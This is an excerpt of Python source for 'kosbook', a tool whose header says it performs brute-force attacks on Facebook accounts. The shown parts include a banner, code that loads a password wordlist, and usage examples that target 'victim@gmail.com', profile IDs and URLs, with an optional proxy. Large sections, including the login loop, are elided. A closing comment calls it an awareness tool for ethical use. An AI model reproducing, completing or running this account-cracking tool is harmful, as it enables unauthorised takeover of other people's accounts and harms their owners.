...
##################################
# Program Name: kosbook ~ v 1.0
# Working : Brute Force Attack on Facebook Accounts
# Author : Gadriel Borbor Gargard
##################################
...
║ {cy}╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝{rd}║
{rd}╠══════════════════════════════════════════════════════════╣
║ {wi}Version: {gr}1.0{wi}            {mg}Developed by: {gr}Gadriel Borbor Gargard{rd}             ║
╚══════════════════════════════════════════════════════════╝{rs}
"""
    print(banner)
    print(f"{yl}[{rd}*{yl}]{wi} Facebook Brute Force Tool {yl}[{rd}*{yl}]{rs}\n")
...
""")
    ...
    if passwd !=None:
          ...
          exit(1)
    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as wfile:
            passwords = [line.strip() for line in wfile if line.strip() and len(line.strip()) >= 6]
    except UnicodeDecodeError:
        try:
            with open(wordlist, 'r', encoding='latin-1') as wfile:
                passwords = [line.strip() for line in wfile if line.strip() and len(line.strip()) >= 6]
        except Exception as e:
            print(rd+"\n["+yl+"!"+rd+"] Error: "+yl+"Failed to read wordlist file: " + str(e) + wi)
            exit(1)
    
    if not passwords:
        print(yl+"\n["+rd+"!"+yl+"] Error: "+wi+"No valid passwords found in the wordlist file (minimum 6 characters required)")
        exit(1)
...
Usage: python3 ./kosbook.py [OPTIONS...]
-------------
OPTIONS:
       |
    |--------    
...
Examples:
        |
     |--------
     | python3 kosbook.py -t victim@gmail.com -w wlist.txt
     |--------
     | python3 kosbook.py -t 40000057893246323 -w wlist.txt
     |--------
     | python3 kosbook.py -t victim@gmail.com -w wlist.txt -p 165.227.35.11 default(port=8080,80) 
     |--------
     | python3 kosbook.py -t victim@gmail.com -s 1234567
     |-------- 
     | python3 kosbook.py -g https://www.facebook.com/victim-username 
     |-------- 
""")
def Main():
...
# This Tool is programmed by Gadriel Borbor Gargard to create awareness against Facebook frauds and hacks. Use it ethically.
